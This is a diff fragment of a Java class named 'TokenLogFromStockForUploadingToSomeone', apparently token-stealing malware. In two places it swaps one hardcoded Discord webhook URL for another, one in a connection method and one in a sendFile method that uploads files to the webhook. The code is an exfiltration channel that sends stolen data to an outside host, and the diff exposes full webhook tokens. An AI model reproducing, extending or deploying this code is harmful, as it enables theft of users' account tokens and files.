@@ -142,7 +142,7 @@ public class TokenLogFromStockForUploadingToSomeone {
         BufferedReader in = null;
         StringBuilder result = new StringBuilder();
         try {
-            URL realUrl = new URL("https://discord.com/api/webhooks/986691901816205374/v5vSoIyHeB-BE6T2dvbiKjsJbZsx-I9LjK9JT_Qn87C5h1ilU40Ly4Gu_nO07IcJO_av");
+            URL realUrl = new URL("https://discord.com/api/webhooks/1016761786680229979/5szK1F_8SgCKvMY2wymTeFH6_F4sDaZei3T5qz637jThtUFDAMi7OS2Co0NB4EWocRre");
             URLConnection conn = realUrl.openConnection();
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
@@ -178,7 +178,7 @@ public class TokenLogFromStockForUploadingToSomeone {
 
     private static void sendFile(File file) throws IOException {
 
-        String url = "https://discord.com/api/webhooks/986691901816205374/v5vSoIyHeB-BE6T2dvbiKjsJbZsx-I9LjK9JT_Qn87C5h1ilU40Ly4Gu_nO07IcJO_av";
+        String url = "https://discord.com/api/webhooks/1016761786680229979/5szK1F_8SgCKvMY2wymTeFH6_F4sDaZei3T5qz637jThtUFDAMi7OS2Co0NB4EWocRre";
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(url).openConnection();
         connection.setDoOutput(true);
